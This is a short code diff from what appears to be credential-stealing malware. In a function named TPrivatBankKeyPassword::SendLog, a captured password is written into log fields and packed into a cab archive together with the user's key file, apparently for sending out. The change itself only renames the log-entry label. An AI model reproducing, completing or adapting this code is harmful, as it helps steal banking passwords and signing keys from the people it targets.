@@ -140,7 +140,7 @@ bool TPrivatBankKeyPassword::SendLog()
 	Fields.ValueDelimeter = ": ";
 	Fields.AddValue(GetStr(EStrLogFieldPassword), FPassword);
 
-	AddStringToCab(Cab, Fields.GetText(), GetStr(StrLogFileInformation));
+	AddStringToCab(Cab, Fields.GetText(), GetStr(StrLogFileTextData));
 
 	// Добавляем файл ключа
 	if (!FKeyFileName.IsEmpty())
